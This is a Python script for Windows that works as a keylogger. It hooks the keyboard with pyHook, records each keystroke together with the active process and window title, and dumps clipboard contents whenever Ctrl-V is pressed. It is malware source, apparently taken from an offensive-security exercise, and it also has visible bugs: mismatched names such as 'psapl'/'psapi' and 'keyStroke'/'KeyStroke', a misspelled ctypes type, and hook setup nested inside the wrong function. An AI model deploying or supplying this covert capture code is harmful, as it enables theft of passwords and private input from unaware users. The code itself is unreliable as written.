#!/usr/bin/python

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32   = windll.user32
kernel32 = windll.kernel32
psapl    = windll.psapi
current_window = None

def get_current_process():
    
    hwnd = user32.GetForegroundWindow()
    
    pid = u_clong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
    
    #
    process_id = "%s" % pid.value
    
    
    # apply some memory
    executable = create_string_buffer("\x00" * 512)
    
    
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    
    psapi.GetModuleBaseNameA(h_process, None, byref(executable),512)
    
    # read the window title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
    
    # print out some information aboute threading(process)
    print
    print "[PID: %s - %s - %s ]" %(process_id, executable.value, window_title.value)
    print
    
    # close the handle
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
    
    def keyStroke(event):
        global current_window
        
        # checke the target if exchange the windows
        if event.WindowName != current_window:
            current_window = event.WindowName
            get_current_process()
            
        # check if the key is normal
        if event.Ascii > 32 and event.Ascii < 127:
            print chr(event.Ascii)
        else:
            # if input key is [Ctrl-V] ,we should get shear plate
            if event.key == "V":
                
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                
                print "[PASTE] - %s" % (pasted_value)
                
            else:
                print "[%s]" % event.key
                
        # return before the hook thing happened
        return True
    # create and login the hookManger
    kl         = pyHook.HookManager()
    kl.keyDown = KeyStroke
    
    # login the hook,
    kl.HookKeyboard()
    pythoncom.PumpMessages()
    
    
    